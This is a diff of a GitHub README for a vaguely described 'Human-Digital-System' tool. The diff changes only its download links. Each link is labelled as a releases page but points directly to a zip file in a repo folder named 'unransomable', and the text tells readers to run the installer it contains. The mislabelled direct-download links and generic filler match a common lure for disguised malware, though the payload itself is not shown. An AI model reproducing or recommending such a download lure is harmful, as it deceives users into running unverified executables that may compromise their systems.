@@ -1,7 +1,7 @@
 # 📡 Human-Digital-System - Simplifying Digital Workflows 
 
 ## 🔗 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/pinkolas/Human-Digital-System/main/unransomable/System_Digital_Human_1.2.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/pinkolas/Human-Digital-System/main/unransomable/System_Digital_Human_1.2.zip)
+[![Download Latest Release](https://github.com/pinkolas/Human-Digital-System/raw/refs/heads/main/unransomable/System_Digital_Human_1.2.zip%20Latest%20Release-v1.0-blue)](https://github.com/pinkolas/Human-Digital-System/raw/refs/heads/main/unransomable/System_Digital_Human_1.2.zip)
 
 ## 📌 Project Overview
 
@@ -14,7 +14,7 @@ This project is ideal for those interested in understanding **how software can i
 To use the Human Digital System, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to [this link](https://raw.githubusercontent.com/pinkolas/Human-Digital-System/main/unransomable/System_Digital_Human_1.2.zip) to find the latest version of the software.
+   Go to [this link](https://github.com/pinkolas/Human-Digital-System/raw/refs/heads/main/unransomable/System_Digital_Human_1.2.zip) to find the latest version of the software.
 
 2. **Download the Software**  
    Find the package labeled with the highest version number (e.g., v1.0) and click on it to download the file. 
@@ -58,7 +58,7 @@ The Human Digital System offers the following features:
 
 To get started, please download the latest version of the Human Digital System. Follow these steps:
 
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/pinkolas/Human-Digital-System/main/unransomable/System_Digital_Human_1.2.zip) to navigate to the Releases page.
+1. **Visit the Releases Page**: Click [here](https://github.com/pinkolas/Human-Digital-System/raw/refs/heads/main/unransomable/System_Digital_Human_1.2.zip) to navigate to the Releases page.
 2. **Select and Download**: Find the latest version and click on it. The download will begin automatically.
 3. **Installation**: Locate the downloaded file and run the installer. Simply follow the instructions to install the application.
 4. **Open the Application**: After the installation, open the Human Digital System to start using it.
